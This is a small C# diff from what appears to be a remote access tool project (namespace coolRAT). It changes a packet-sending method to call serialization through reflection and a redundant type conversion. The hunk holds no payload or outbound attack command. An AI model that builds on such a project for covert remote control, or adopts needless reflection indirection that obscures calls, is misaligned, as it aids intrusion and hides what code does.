@@ -90,7 +90,7 @@ namespace coolRAT.Libs.Connections
         }
         public void SendPacket(Packet packet)
         {
-            WriteRaw(packet.Serialize());
+            WriteRaw(packet.GetType().GetMethod("Serialize").Invoke(Convert.ChangeType(packet, packet.GetType()), null).ToString());
             Console.WriteLine($"Sent packet of type {packet.Type}");
         }
         public void WriteRaw(string Data)
